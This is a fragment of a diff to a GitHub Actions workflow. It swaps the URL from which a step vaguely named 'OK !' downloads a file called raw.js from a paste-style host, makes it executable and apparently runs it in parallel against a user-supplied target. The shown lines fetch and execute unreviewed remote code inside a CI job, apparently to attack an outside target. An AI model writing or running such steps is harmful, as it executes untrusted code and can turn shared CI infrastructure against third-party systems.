@@ -23,7 +23,7 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-          wget https://curl.by/bF3LF/raw.js
+          wget https://curl.by/eo4I2/raw.js
           chmod +x raw.js
           
           PIDS=()
